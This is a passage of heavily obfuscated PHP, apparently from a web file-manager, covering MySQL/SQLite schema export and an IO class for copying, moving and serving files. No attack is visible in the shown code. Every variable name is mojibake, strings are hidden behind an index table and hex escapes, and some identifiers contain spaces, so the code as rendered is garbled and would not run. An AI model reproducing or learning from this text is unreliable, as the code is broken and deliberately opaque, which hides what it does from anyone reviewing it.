$ù¢á¡ =& $_SERVER[ñ÷§¡å]; $ßÁª¾ë© = $this->dbType(!0); $Â• ø±› = CONTROLLER_DIR . "\x69\x6e\x73\x74\141\x6c\x6c\x2f\x64\141\164\x61\57{$ßÁª¾ë©}\x2e\163\161\x6c"; $Ô“´‹“Û = file_get_contents($Â• ø±›); $´óˆàì… = $ù¢á¡[1092] . ($ßÁª¾ë© == $ù¢á¡[817] ? $ù¢á¡[1093] : $ù¢á¡[1094]) . $ù¢á¡[1095]; preg_match_all($´óˆàì…, $Ô“´‹“Û, $ˆõ–Ø½Ì); $¸Ä­åõË = $ˆõ–Ø½Ì[1]; $ª´¶äÍ = $this->model()->db(); $èäĞ‘Íô = $ª´¶äÍ->getTables(); $ëåö¸ª = TEMP_FILES . $ù¢á¡[1096] . date($ù¢á¡[764]) . $ù¢á¡[8]; del_dir($ëåö¸ª); mk_dir($ëåö¸ª); $Á¢ØÛÔ = $ëåö¸ª . $ù¢á¡[1097]; $ÂÌø©ú = $ëåö¸ª . $ù¢á¡[1098]; $¸¶®°ñ = $ßÁª¾ë© == $ù¢á¡[13] ? $ù¢á¡[817] : $ù¢á¡[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\x61\154\x6c\57\x64\x61\x74\141\57{$¸¶®°ñ}\x2e\x73\161\154", $ëåö¸ª); @touch($ëåö¸ª . $ßÁª¾ë© . $ù¢á¡[801]); $´í„Ÿ = fopen($Á¢ØÛÔ, $ù¢á¡[1073]); $Ë™ËÇËœ = fopen($ÂÌø©ú, $ù¢á¡[1073]); if ($ßÁª¾ë© == $ù¢á¡[13]) { $èäĞ‘Íô = array_diff($èäĞ‘Íô, array($ù¢á¡[797], $ù¢á¡[798])); $ûÓ£®šù = array($ù¢á¡[1099], $ù¢á¡[1100], $ù¢á¡[1101]); fwrite($Ë™ËÇËœ, implode(PHP_EOL, $ûÓ£®šù) . PHP_EOL . PHP_EOL); foreach ($èäĞ‘Íô as $®Ñ››ü) { $˜ÔÉÉÖØ = $this->sqlFromSqlite($®Ñ››ü); if (!$˜ÔÉÉÖØ[$ù¢á¡[13]]) { continue; } fwrite($Ë™ËÇËœ, $˜ÔÉÉÖØ[$ù¢á¡[13]] . PHP_EOL . PHP_EOL); if (!in_array($®Ñ››ü, $¸Ä­åõË)) { fwrite($´í„Ÿ, $˜ÔÉÉÖØ[$ù¢á¡[817]] . PHP_EOL . PHP_EOL); } } } else { foreach ($èäĞ‘Íô as $®Ñ››ü) { $˜ÔÉÉÖØ = $this->sqlFromMysql($®Ñ››ü); if (!$˜ÔÉÉÖØ[$ù¢á¡[817]]) { continue; } fwrite($´í„Ÿ, $˜ÔÉÉÖØ[$ù¢á¡[817]] . PHP_EOL . PHP_EOL); if (!in_array($®Ñ››ü, $¸Ä­åõË)) { fwrite($Ë™ËÇËœ, $˜ÔÉÉÖØ[$ù¢á¡[13]] . PHP_EOL . PHP_EOL); } } } fclose($´í„Ÿ); fclose($Ë™ËÇËœ); $Ô“´‹“Û = array($ù¢á¡[817] => $Á¢ØÛÔ, $ù¢á¡[13] => $ÂÌø©ú); return $ˆÑò½–İ ? $Ô“´‹“Û[$ˆÑò½–İ] : $Ô“´‹“Û; } public function dbType($Ï‹¾ÇáÜ = false) { $‚ƒƒÇî» =& $_SERVER[ñ÷§¡å]; $ëÊÈ œ = $Ï‹¾ÇáÜ ? $GLOBALS[$‚ƒƒÇî»[6]][$‚ƒƒÇî»[21]] : $this->database; $ëÊÈ œ = array_change_key_case($ëÊÈ œ); $¯Œí«¸ = $ëÊÈ œ[$‚ƒƒÇî»[974]]; if ($¯Œí«¸ == $‚ƒƒÇî»[971]) { $•¬ä‚°Ñ = explode($‚ƒƒÇî»[4], $ëÊÈ œ[$‚ƒƒÇî»[980]]); $¯Œí«¸ = $•¬ä‚°Ñ[0]; } $ËÑê§’ = array($‚ƒƒÇî»[1102] => $‚ƒƒÇî»[13], $‚ƒƒÇî»[919] => $‚ƒƒÇî»[817]); if (isset($ËÑê§’[$¯Œí«¸])) { $¯Œí«¸ = $ËÑê§’[$¯Œí«¸]; } return $¯Œí«¸; } public function sqlFromMysql($Ü áÎ÷÷, $¡îş´Š° = '') { $óš‰–ë¯ =& $_SERVER[ñ÷§¡å]; $öñ»£şè = $this->model()->db(); $¶óæÄƒ† = $öñ»£şè->query($óš‰–ë¯[1103] . $Ü áÎ÷÷ . $óš‰–ë¯[394]); if (!$¶óæÄƒ† || !$¶óæÄƒ†[0]) { return !1; } $°ù²ßú = _get($¶óæÄƒ†[0], $óš‰–ë¯[1104], $óš‰–ë¯[12]); if (!$°ù²ßú) { return !1; } $™µ¹µôË = "\104\x52\x4f\120\40\124\x41\x42\114\105\x20\x49\106\x20\105\x58\x49\x53\x54\123\40\x60{$Ü áÎ÷÷}\140\x3b" . PHP_EOL . $°ù²ßú . $óš‰–ë¯[81]; if ($¡îş´Š° && $¡îş´Š° == $óš‰–ë¯[817]) { return $™µ¹µôË; } $¡Å’“³É = array_change_key_case($GLOBALS[$óš‰–ë¯[6]][$óš‰–ë¯[21]]); $¾ÅÏ×ö‚ = $¡Å’“³É[$óš‰–ë¯[979]]; $©…¡Ò²› = $óš‰–ë¯[1105] . $¾ÅÏ×ö‚ . $óš‰–ë¯[1106] . $Ü áÎ÷÷ . $óš‰–ë¯[58]; $´­²´Ê— = $óš‰–ë¯[1107] . $Ü áÎ÷÷ . $óš‰–ë¯[907]; $¤“¶‹¿› = $öñ»£şè->query($©…¡Ò²›); if (empty($¤“¶‹¿›)) { $ã™çÑº³ = array($óš‰–ë¯[817] => $óš‰–ë¯[12], $óš‰–ë¯[13] => $óš‰–ë¯[12]); return $¡îş´Š° ? $ã™çÑº³[$¡îş´Š°] : $ã™çÑº³; } $àŒÆÖ„Ë = $öñ»£şè->query($´­²´Ê—); $†üˆÃ = $óš‰–ë¯[12]; $‡­Ÿ¬İ = array(); foreach ($àŒÆÖ„Ë as $Íß¢ì’) { if (!$†üˆÃ && $Íß¢ì’[$óš‰–ë¯[1108]] == $óš‰–ë¯[1109]) { $†üˆÃ = $Íß¢ì’[$óš‰–ë¯[1110]]; } if (isset($‡­Ÿ¬İ[$Íß¢ì’[$óš‰–ë¯[1108]]])) { $‡­Ÿ¬İ[$Íß¢ì’[$óš‰–ë¯[1108]]][$óš‰–ë¯[1111]][] = $Íß¢ì’[$óš‰–ë¯[1110]]; continue; } $‡­Ÿ¬İ[$Íß¢ì’[$óš‰–ë¯[1108]]] = array($óš‰–ë¯[1112] => $Íß¢ì’[$óš‰–ë¯[1108]], $óš‰–ë¯[1111] => array($Íß¢ì’[$óš‰–ë¯[1110]]), $óš‰–ë¯[1113] => $Íß¢ì’[$óš‰–ë¯[1114]] == $óš‰–ë¯[98] ? 0 : 1); } $‘öìÖÙ« = array(); foreach ($‡­Ÿ¬İ as $Íß¢ì’) { $¸äş¨«“ = $Íß¢ì’[$óš‰–ë¯[1112]] == $óš‰–ë¯[1109]; $ã÷Ÿğîë = array($óš‰–ë¯[1115], $Íß¢ì’[$óš‰–ë¯[1113]] == $óš‰–ë¯[98] && !$¸äş¨«“ ? $óš‰–ë¯[1116] : $óš‰–ë¯[12], $óš‰–ë¯[1117], $óš‰–ë¯[1118] . $Ü áÎ÷÷ . $óš‰–ë¯[11] . ($¸äş¨«“ ? $óš‰–ë¯[1119] : $Íß¢ì’[$óš‰–ë¯[1112]]) . $óš‰–ë¯[128], $óš‰–ë¯[1120], $óš‰–ë¯[128] . $Ü áÎ÷÷ . $óš‰–ë¯[128], $óš‰–ë¯[1121] . implode($óš‰–ë¯[1122], $Íß¢ì’[$óš‰–ë¯[1111]]) . $óš‰–ë¯[1123]); $‘öìÖÙ«[] = implode($óš‰–ë¯[53], $ã÷Ÿğîë) . $óš‰–ë¯[81]; } $‡·ª«¥ = array(); $Ë¢ŸŸÌ” = array($óš‰–ë¯[1124] => $óš‰–ë¯[1125], $óš‰–ë¯[1125] => $óš‰–ë¯[1125], $óš‰–ë¯[297] => $óš‰–ë¯[324], $óš‰–ë¯[296] => $óš‰–ë¯[324]); foreach ($¤“¶‹¿› as $Íß¢ì’) { $ã÷Ÿğîë = array($óš‰–ë¯[128] . $Íß¢ì’[$óš‰–ë¯[1126]] . $óš‰–ë¯[128], isset($Ë¢ŸŸÌ”[$Íß¢ì’[$óš‰–ë¯[1127]]]) ? $Ë¢ŸŸÌ”[$Íß¢ì’[$óš‰–ë¯[1127]]] : $Íß¢ì’[$óš‰–ë¯[1128]], $Íß¢ì’[$óš‰–ë¯[1129]] == $óš‰–ë¯[905] ? $óš‰–ë¯[1130] : $óš‰–ë¯[1131], $Íß¢ì’[$óš‰–ë¯[1126]] == $†üˆÃ ? $óš‰–ë¯[1132] : $óš‰–ë¯[12], $Íß¢ì’[$óš‰–ë¯[956]] ? strtoupper(str_replace($óš‰–ë¯[11], $óš‰–ë¯[12], $Íß¢ì’[$óš‰–ë¯[956]])) : $óš‰–ë¯[12]); $‡·ª«¥[] = trim(implode($óš‰–ë¯[53], $ã÷Ÿğîë)); } $†ùÏÍ—Ş = array($óš‰–ë¯[1133] . $Ü áÎ÷÷ . $óš‰–ë¯[1134], $óš‰–ë¯[1135] . $Ü áÎ÷÷ . $óš‰–ë¯[1136], implode($óš‰–ë¯[50] . PHP_EOL, $‡·ª«¥), $óš‰–ë¯[953]); $Ë–†…šÄ = implode(PHP_EOL, array_merge($†ùÏÍ—Ş, $‘öìÖÙ«)); if ($¡îş´Š° && $¡îş´Š° == $óš‰–ë¯[13]) { return $Ë–†…šÄ; } $ã™çÑº³ = array($óš‰–ë¯[817] => $™µ¹µôË, $óš‰–ë¯[13] => $Ë–†…šÄ); return $¡îş´Š° ? $ã™çÑº³[$¡îş´Š°] : $ã™çÑº³; } public function sqlFromSqlite($—ÏÓ‚…Ö, $¨Òü×Íğ = '') { $éÂ¶¥û¥ =& $_SERVER[ñ÷§¡å]; $í‘ÙóòŸ = $this->model()->db(); $úĞò–æÄ = "\x50\x52\x41\107\115\x41\40\124\101\x42\x4c\x45\x5f\x49\116\106\117\40\x28\47{$—ÏÓ‚…Ö}\47\51"; $©ËöÙß• = "\123\105\114\105\x43\x54\x20\52\40\x46\x52\x4f\x4d\40\x73\x71\154\151\x74\x65\x5f\x6d\x61\x73\164\145\x72\x20\127\110\105\122\105\x20\164\142\154\137\x6e\x61\x6d\145\x20\x3d\40\47{$—ÏÓ‚…Ö}\47"; $İˆÅ˜ = $í‘ÙóòŸ->query($úĞò–æÄ); if (empty($İˆÅ˜)) { $î›ëàßè = array($éÂ¶¥û¥[817] => $éÂ¶¥û¥[12], $éÂ¶¥û¥[13] => $éÂ¶¥û¥[12]); return $¨Òü×Íğ ? $î›ëàßè[$¨Òü×Íğ] : $î›ëàßè; } $ø™áú¶ü = $í‘ÙóòŸ->query($©ËöÙß•); $ÅÖ‹¨ù = $¹İÂË’Í = array(); foreach ($ø™áú¶ü as $³ïúô¹ú) { if ($³ïúô¹ú[$éÂ¶¥û¥[33]] == $éÂ¶¥û¥[288]) { $ÅÖ‹¨ù[] = $³ïúô¹ú[$éÂ¶¥û¥[1137]]; } else { $¹İÂË’Í[$³ïúô¹ú[$éÂ¶¥û¥[32]]] = $³ïúô¹ú[$éÂ¶¥û¥[1137]]; } } $ìÀÌ“¤ä = array_merge(array($éÂ¶¥û¥[1133] . $—ÏÓ‚…Ö . $éÂ¶¥û¥[128]), $ÅÖ‹¨ù, array_values($¹İÂË’Í)); $ìÀÌ“¤ä = implode($éÂ¶¥û¥[81] . PHP_EOL, $ìÀÌ“¤ä) . $éÂ¶¥û¥[81]; if ($¨Òü×Íğ && $¨Òü×Íğ == $éÂ¶¥û¥[13]) { return $ìÀÌ“¤ä; } $áĞ«Œ· = array(); $¸™¶“Å¤ = array($éÂ¶¥û¥[1125] => $éÂ¶¥û¥[1138], $éÂ¶¥û¥[324] => $éÂ¶¥û¥[1139]); $×Ñ„«‚Ì = $éÂ¶¥û¥[12]; foreach ($İˆÅ˜ as $³ïúô¹ú) { if ($³ïúô¹ú[$éÂ¶¥û¥[57]] == $éÂ¶¥û¥[98]) { $×Ñ„«‚Ì = $³ïúô¹ú[$éÂ¶¥û¥[32]]; } $úìı‹ùˆ = array($éÂ¶¥û¥[394] . $³ïúô¹ú[$éÂ¶¥û¥[32]] . $éÂ¶¥û¥[394], isset($¸™¶“Å¤[$³ïúô¹ú[$éÂ¶¥û¥[33]]]) ? $¸™¶“Å¤[$³ïúô¹ú[$éÂ¶¥û¥[33]]] : $³ïúô¹ú[$éÂ¶¥û¥[33]], $³ïúô¹ú[$éÂ¶¥û¥[35]] == $éÂ¶¥û¥[98] ? $éÂ¶¥û¥[1130] : $éÂ¶¥û¥[1140] . $³ïúô¹ú[$éÂ¶¥û¥[56]], $³ïúô¹ú[$éÂ¶¥û¥[57]] == $éÂ¶¥û¥[98] ? $éÂ¶¥û¥[1141] : $éÂ¶¥û¥[12]); $áĞ«Œ·[] = trim(implode($éÂ¶¥û¥[53], $úìı‹ùˆ)); } foreach ($¹İÂË’Í as $Ôø“çé => $Ê¿‚°ò”) { $·¹íÈÏ» = str_replace($éÂ¶¥û¥[1142] . $—ÏÓ‚…Ö . $éÂ¶¥û¥[11], $éÂ¶¥û¥[12], $Ôø“çé); $æ›¢Ëı = str_replace(array($éÂ¶¥û¥[128], $éÂ¶¥û¥[964]), $éÂ¶¥û¥[394], substr($Ê¿‚°ò”, stripos($Ê¿‚°ò”, $éÂ¶¥û¥[269]))); if ($·¹íÈÏ» == $éÂ¶¥û¥[1119]) { $Ş›ı°×Š = $éÂ¶¥û¥[1143] . $×Ñ„«‚Ì . $éÂ¶¥û¥[1144]; } else { $Ş›ı°×Š = (stripos($·¹íÈÏ», $éÂ¶¥û¥[11]) ? $éÂ¶¥û¥[1145] : $éÂ¶¥û¥[12]) . ($éÂ¶¥û¥[1146] . $·¹íÈÏ» . $éÂ¶¥û¥[1147] . $æ›¢Ëı); } $áĞ«Œ·[] = $Ş›ı°×Š; } $ÇŒ»Šâ¯ = array($éÂ¶¥û¥[1148] . $—ÏÓ‚…Ö . $éÂ¶¥û¥[1149], $éÂ¶¥û¥[1150] . $—ÏÓ‚…Ö . $éÂ¶¥û¥[1151], implode($éÂ¶¥û¥[50] . PHP_EOL, $áĞ«Œ·), $éÂ¶¥û¥[1152]); $ÚÕü—¨ì = implode(PHP_EOL, $ÇŒ»Šâ¯); if ($¨Òü×Íğ && $¨Òü×Íğ == $éÂ¶¥û¥[817]) { return $ÚÕü—¨ì; } $î›ëàßè = array($éÂ¶¥û¥[817] => $ÚÕü—¨ì, $éÂ¶¥û¥[13] => $ìÀÌ“¤ä); return $¨Òü×Íğ ? $î›ëàßè[$¨Òü×Íğ] : $î›ëàßè; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¬ò´‡Œ¿, $³ãÀœ¼ô) { $ûŠ­²üã =& $_SERVER[ñ÷§¡å]; $êƒß¨ = $³ãÀœ¼ô; $GLOBALS[$ûŠ­²üã[1153]] = $ûŠ­²üã[1154] . $¬ò´‡Œ¿; Hook::trigger($ûŠ­²üã[1154] . $¬ò´‡Œ¿ . $ûŠ­²üã[1155], $êƒß¨); $“ğ²ªõ = self::driverMake($³ãÀœ¼ô[0]); if (!$“ğ²ªõ) { return !1; } if (method_exists($“ğ²ªõ, $¬ò´‡Œ¿)) { $ÜÓ”Ú‡¼ = @call_user_func_array(array($“ğ²ªõ, $¬ò´‡Œ¿), $³ãÀœ¼ô); } else { if (method_exists($“ğ²ªõ, $ûŠ­²üã[1156])) { $ÜÓ”Ú‡¼ = @call_user_func_array(array($“ğ²ªõ, $¬ò´‡Œ¿), $³ãÀœ¼ô); } else { if (method_exists(self, $¬ò´‡Œ¿)) { $ÜÓ”Ú‡¼ = @call_user_func_array(array(self, $¬ò´‡Œ¿), $³ãÀœ¼ô); } else { $ÜÓ”Ú‡¼ = call_user_func_array(array(parent, $¬ò´‡Œ¿), $³ãÀœ¼ô); } } } Hook::trigger($ûŠ­²üã[1154] . $¬ò´‡Œ¿ . $ûŠ­²üã[1157], $êƒß¨, $ÜÓ”Ú‡¼); return $ÜÓ”Ú‡¼; } public static function init($íØŸ¿ãç) { return self::driverMake($íØŸ¿ãç); } public static function copy($ú‘¯ÌÕÆ, $í®ì«¢, $Êƒ½äÎÁ = false, $Ä®ƒõÃ’ = false) { return self::copyMoveStart($ú‘¯ÌÕÆ, $í®ì«¢, $Êƒ½äÎÁ, $_SERVER[ñ÷§¡å][564], $Ä®ƒõÃ’); } public static function move($ƒ¼ŞÆò, $ä—“›óµ, $ùŠÄ‡¢¯ = false, $ŸŸ¥¤ƒÕ = false) { return self::copyMoveStart($ƒ¼ŞÆò, $ä—“›óµ, $ùŠÄ‡¢¯, $_SERVER[ñ÷§¡å][566], $ŸŸ¥¤ƒÕ); } private static function copyMoveStart($µë™€ ü, $Ôî Û·Ì, $ãœüŸş³, $÷ğ¤†ô…, $ÂÖ®ŞªÛ) { $ªå™Ü›¼ =& $_SERVER[ñ÷§¡å]; $ª˜»ß©ã = array($µë™€ ü, $Ôî Û·Ì, $ãœüŸş³, $ÂÖ®ŞªÛ); Hook::trigger($ªå™Ü›¼[1154] . $÷ğ¤†ô… . $ªå™Ü›¼[1155], $ª˜»ß©ã); $âîêÃùö = self::copyMove($µë™€ ü, $Ôî Û·Ì, $ãœüŸş³, $÷ğ¤†ô…, $ÂÖ®ŞªÛ); Hook::trigger($ªå™Ü›¼[1154] . $÷ğ¤†ô… . $ªå™Ü›¼[1157], $ª˜»ß©ã, $âîêÃùö); return $âîêÃùö; } public static function saveFile($ÒŒ°÷Ë¿, $×ï´ÁæÕ, $áÅ¶ì§ = true) { $’²Ôúöš =& $_SERVER[ñ÷§¡å]; $ÌŒœ‘áª = self::info($×ï´ÁæÕ); $ìçÛ¨æ¡ = self::driverMake($ÒŒ°÷Ë¿); $ƒüˆƒ†â = self::driverMake($×ï´ÁæÕ); $Ã£‘‘œ = !1; if ($ƒüˆƒ†â->pathParse[$’²Ôúöš[1158]]) { $Ã£‘‘œ = $ƒüˆƒ†â; $ĞÆË…€Ö = $ƒüˆƒ†â->pathParse[$’²Ôúöš[1158]]; $ƒüˆƒ†â = self::driverMake($ĞÆË…€Ö); } if ($ìçÛ¨æ¡->pathParse[$’²Ôúöš[1158]]) { $ãè§Ôç¨ = $ìçÛ¨æ¡->pathParse[$’²Ôúöš[1158]]; $ìçÛ¨æ¡ = self::driverMake($ãè§Ôç¨); } $”÷ÇˆÅâ = $ƒüˆƒ†â->pathFather($×ï´ÁæÕ); $ÙĞ‚–„ = !0; if (!$áÅ¶ì§ && self::driverIsSame($ìçÛ¨æ¡, $ƒüˆƒ†â)) { $ÙĞ‚–„ = !1; } $éŒ”ì¤Œ = self::copyFile($ìçÛ¨æ¡, $ÒŒ°÷Ë¿, $ƒüˆƒ†â, $”÷ÇˆÅâ, $ÌŒœ‘áª[$’²Ôúöš[32]], $ÙĞ‚–„); if ($Ã£‘‘œ) { $éŒ”ì¤Œ = $Ã£‘‘œ->getPathOuter($éŒ”ì¤Œ); } return $éŒ”ì¤Œ; } private static function copyMove($ò«¹ ‡¶, $Ó×°£Ğ‚, $‡…‚Ô¶ñ, $³Î‘”‘, $á´”Ûö = false) { $ƒªí©üª =& $_SERVER[ñ÷§¡å]; if (!$ò«¹ ‡¶ || $ò«¹ ‡¶ == $ƒªí©üª[8] || !$Ó×°£Ğ‚) { return !1; } ignore_timeout(); $æ³­èÆ• = self::driverMake($ò«¹ ‡¶); $‹œò¸ÍÒ = self::driverMake($Ó×°£Ğ‚); $Ú†ûë®Ş = $³Î‘”‘ == $ƒªí©üª[566]; $ü¿¼ŒŞ = !1; if ($‹œò¸ÍÒ->pathParse[$ƒªí©üª[1158]]) { $ü¿¼ŒŞ = $‹œò¸ÍÒ; $Ó×°£Ğ‚ = $‹œò¸ÍÒ->pathParse[$ƒªí©üª[1158]]; $‹œò¸ÍÒ = self::driverMake($Ó×°£Ğ‚); } if ($æ³­èÆ•->pathParse[$ƒªí©üª[1158]]) { $ò«¹ ‡¶ = $æ³­èÆ•->pathParse[$ƒªí©üª[1158]]; $æ³­èÆ• = self::driverMake($ò«¹ ‡¶); } self::check($æ³­èÆ•, $ò«¹ ‡¶, $‹œò¸ÍÒ, $Ó×°£Ğ‚); Hook::trigger($ƒªí©üª[1159], $æ³­èÆ•, $ò«¹ ‡¶, $‹œò¸ÍÒ, $Ó×°£Ğ‚); $Î½³Ì÷ = self::driverIsSame($æ³­èÆ•, $‹œò¸ÍÒ); if ($Î½³Ì÷) { if ($³Î‘”‘ == $ƒªí©üª[566] && !method_exists($‹œò¸ÍÒ, $ƒªí©üª[1160]) && trim($Ó×°£Ğ‚, $ƒªí©üª[8]) == trim($‹œò¸ÍÒ->pathFather($ò«¹ ‡¶), $ƒªí©üª[8])) { if ($æ³­èÆ•->pathThis($ò«¹ ‡¶) != $á´”Ûö && !$æ³­èÆ•->isTypeObject()) { return $æ³­èÆ•->rename($ò«¹ ‡¶, $á´”Ûö); } return $‹œò¸ÍÒ->getPathOuter($ò«¹ ‡¶); } if (method_exists($‹œò¸ÍÒ, $³Î‘”‘)) { return $‹œò¸ÍÒ->{$³Î‘”‘}($ò«¹ ‡¶, $Ó×°£Ğ‚, $‡…‚Ô¶ñ, $á´”Ûö); } } if ($Î½³Ì÷ && $³Î‘”‘ == $ƒªí©üª[566] && $‹œò¸ÍÒ->getType() == $ƒªí©üª[116]) { $âÒ±‹Œ´ = $‹œò¸ÍÒ->movePath($ò«¹ ‡¶, $Ó×°£Ğ‚, $á´”Ûö); if ($âÒ±‹Œ´) { return $âÒ±‹Œ´; } } $¬´˜”áâ = $æ³­èÆ•->isFile($ò«¹ ‡¶); if (!$¬´˜”áâ && $‹œò¸ÍÒ->getType() == $ƒªí©üª[771] && $æ³­èÆ•->getType() == $ƒªí©üª[116]) { $âÒ±‹Œ´ = $‹œò¸ÍÒ->copyFolderFromIO($æ³­èÆ•, $ò«¹ ‡¶, $Ó×°£Ğ‚, $‡…‚Ô¶ñ, $Ú†ûë®Ş, $á´”Ûö); } else { $âÒ±‹Œ´ = self::copyPath($æ³­èÆ•, $ò«¹ ‡¶, $‹œò¸ÍÒ, $Ó×°£Ğ‚, $‡…‚Ô¶ñ, $Ú†ûë®Ş, $¬´˜”áâ, $á´”Ûö); } if ($âÒ±‹Œ´ && $Ú†ûë®Ş) { $æ³­èÆ•->remove($ò«¹ ‡¶); } if ($ü¿¼ŒŞ) { $âÒ±‹Œ´ = $ü¿¼ŒŞ->getPathOuter($âÒ±‹Œ´); } return $âÒ±‹Œ´; } private static function check($ıåÊ–şª, $áÏŞáïµ, $¾ÚüİÑÛ, &$İ‡ıñ°) { $¸÷±ÊÒ« =& $_SERVER[ñ÷§¡å]; if (self::driverIsSame($ıåÊ–şª, $¾ÚüİÑÛ) && $ıåÊ–şª->isFolder($áÏŞáïµ) && $ıåÊ–şª->isParentOf($áÏŞáïµ, $İ‡ıñ°)) { show_json(LNG($¸÷±ÊÒ«[1161]), !1); } if (!$ıåÊ–şª->exist($áÏŞáïµ)) { show_json(LNG($¸÷±ÊÒ«[115]), !1); } } private static function copyPath($é÷åä§, $‡à˜ı½á, $äÅæÆ¾, $Š×ÚÖÉ, $ÄÕõüŠ, $ûªÅüºÖ, $ıÉäƒÍÁ, $—î©‹ñ§ = false, $¼×¾…•ğ = true) { $¬®‰Ò· =& $_SERVER[ñ÷§¡å]; $ì“©øŸ = empty($—î©‹ñ§) && $—î©‹ñ§ !== $¬®‰Ò·[207] ? $é÷åä§->pathThis($‡à˜ı½á) : $—î©‹ñ§; if ($ÄÕõüŠ) { $±÷ÀÈ´ª = $äÅæÆ¾->fileNameExist($Š×ÚÖÉ, $ì“©øŸ); $ØÖ°ŸÊÔ = $ì“©øŸ; $ì“©øŸ = $äÅæÆ¾->fileNameAuto($Š×ÚÖÉ, $ì“©øŸ, $ÄÕõüŠ, !$ıÉäƒÍÁ); if (!$±÷ÀÈ´ª || $ØÖ°ŸÊÔ != $ì“©øŸ) { $ÄÕõüŠ = !1; } if ($¼×¾…•ğ && !$ÄÕõüŠ) { $äÅæÆ¾->_data[$¬®‰Ò·[1162]] = !0; } } if ($ıÉäƒÍÁ) { return self::copyFile($é÷åä§, $‡à˜ı½á, $äÅæÆ¾, $Š×ÚÖÉ, $ì“©øŸ, $ûªÅüºÖ); } if ($ÄÕõüŠ == REPEAT_RENAME_FOLDER) { $ÄÕõüŠ = !1; } $Šœã¿ = rtrim($Š×ÚÖÉ, $¬®‰Ò·[8]) . $¬®‰Ò·[8] . $ì“©øŸ; $şËŒ‡Â = $äÅæÆ¾->mkdir($äÅæÆ¾->getPath($Šœã¿), $ÄÕõüŠ); $Š×ÚÖÉ = $äÅæÆ¾->getPathInner($şËŒ‡Â); $¨€ç¦§ƒ = $é÷åä§->listPath($‡à˜ı½á, !0); $¨€ç¦§ƒ = is_array($¨€ç¦§ƒ) ? $¨€ç¦§ƒ : array($¬®‰Ò·[93] => array(), $¬®‰Ò·[92] => array()); $¹®šº—„ = array_merge($¨€ç¦§ƒ[$¬®‰Ò·[93]], $¨€ç¦§ƒ[$¬®‰Ò·[92]]); foreach ($¹®šº—„ as $å‰…¤ñĞ) { $şí…üÈ¬ = $å‰…¤ñĞ[$¬®‰Ò·[33]] == $¬®‰Ò·[209]; $‡à˜ı½á = $é÷åä§->getPathInner($å‰…¤ñĞ[$¬®‰Ò·[94]]); $ÓŠêÂÕÏ = self::copyPath($é÷åä§, $‡à˜ı½á, $äÅæÆ¾, $Š×ÚÖÉ, $ÄÕõüŠ, $ûªÅüºÖ, $şí…üÈ¬, !1, !1); if (!$ÓŠêÂÕÏ) { IO::errorTips($¬®‰Ò·[1163] . $‡à˜ı½á . $¬®‰Ò·[80] . $Š×ÚÖÉ); } } self::copyMoveKeepInfo($é÷åä§, $‡à˜ı½á, $şËŒ‡Â); return $şËŒ‡Â; } private static function copyFile($Øƒï¥ÒÙ, $ÅĞŒÈ¸, $ªµ¾’ü—, $Œü€ê‚º, $ÏÊéãú, $Ù“ÇñØ¡) { $Á÷§ á· =& $_SERVER[ñ÷§¡å]; $Œü€ê‚º = $ªµ¾’ü—->getPath(rtrim($Œü€ê‚º, $Á÷§ á·[8]) . $Á÷§ á·[8] . $ÏÊéãú); $¯·–ß“© = $Á÷§ á·[1164] . time() . rand_string(5); Hook::trigger($Á÷§ á·[1165], $Øƒï¥ÒÙ, $ÅĞŒÈ¸, $ªµ¾’ü—, $Œü€ê‚º, $ÏÊéãú, $¯·–ß“©); if (self::driverIsSame($Øƒï¥ÒÙ, $ªµ¾’ü—)) { if ($Ù“ÇñØ¡) { $²”ì´±â = $ªµ¾’ü—->moveFile($ÅĞŒÈ¸, $Œü€ê‚º); } else { $²”ì´±â = $ªµ¾’ü—->copyFile($ÅĞŒÈ¸, $Œü€ê‚º); } Hook::trigger($Á÷§ á·[1166], $Øƒï¥ÒÙ, $ÅĞŒÈ¸, $ªµ¾’ü—, $Œü€ê‚º, $ÏÊéãú, $²”ì´±â); self::copyMoveKeepInfo($Øƒï¥ÒÙ, $ÅĞŒÈ¸, $²”ì´±â); return $²”ì´±â; } $„ÜîÂ» = TEMP_FILES; if ($GLOBALS[$Á÷§ á·[6]][$Á÷§ á·[99]][$Á÷§ á·[809]]) { $„ÜîÂ» = $GLOBALS[$Á÷§ á·[6]][$Á÷§ á·[99]][$Á÷§ á·[809]]; } $á–¡ı˜… = $„ÜîÂ»; mk_dir($á–¡ı˜…); $†Á“» ’ = $á–¡ı˜… . $¯·–ß“©; $¦ûÀ±Û° = $†Á“» ’; $†Á“» ’ = $Øƒï¥ÒÙ->download($ÅĞŒÈ¸, $†Á“» ’); $†Á“» ’ = $Øƒï¥ÒÙ->iconvApp($†Á“» ’); if (substr($†Á“» ’, strlen($„ÜîÂ»)) == $„ÜîÂ») { $Ù“ÇñØ¡ = !0; } $²”ì´±â = $ªµ¾’ü—->upload($Œü€ê‚º, $†Á“» ’, $Ù“ÇñØ¡); self::remove($¦ûÀ±Û°); Hook::trigger($Á÷§ á·[1166], $Øƒï¥ÒÙ, $ÅĞŒÈ¸, $ªµ¾’ü—, $Œü€ê‚º, $ÏÊéãú, $²”ì´±â); self::copyMoveKeepInfo($Øƒï¥ÒÙ, $ÅĞŒÈ¸, $²”ì´±â); return $²”ì´±â; } private static function copyMoveKeepInfo($êÔ¢ûâì, $¯ØşµóÍ, $Š­Õõ›) { if (!$Š­Õõ›) { return; } $µ¢³Ç”¾ = $êÔ¢ûâì->info($¯ØşµóÍ); if (!is_array($µ¢³Ç”¾)) { return; } IO::setModifyTime($Š­Õõ›, $µ¢³Ç”¾[$_SERVER[ñ÷§¡å][95]]); } public static function pathFather($ç¨ø¯ˆæ) { $åòè‚Ş = IO::init($ç¨ø¯ˆæ); $¼ÄÎè¿á = $åòè‚Ş->pathFather($åòè‚Ş->path); return $åòè‚Ş->getPathOuter($¼ÄÎè¿á); } public static function fileOut($Ÿ­ëôıì, $Á³ÄÖğ = false, $¢êç±šã = false, $Ï„›’°ò = '') { $±Õ÷¥¨Ú = self::driverMake($Ÿ­ëôıì); if ($±Õ÷¥¨Ú->isFileOutServer()) { return $±Õ÷¥¨Ú->fileOutServer($Ÿ­ëôıì, $Á³ÄÖğ, $¢êç±šã, $Ï„›’°ò); } return $±Õ÷¥¨Ú->fileOut($Ÿ­ëôıì, $Á³ÄÖğ, $¢êç±šã, $Ï„›’°ò); } public static function fileOutImage($ğ¡£í¥, $“ÓıÈÄŸ = 250) { $¸½Ôñâä = array(250, 600, 1200, 2000, 3000, 5000); for 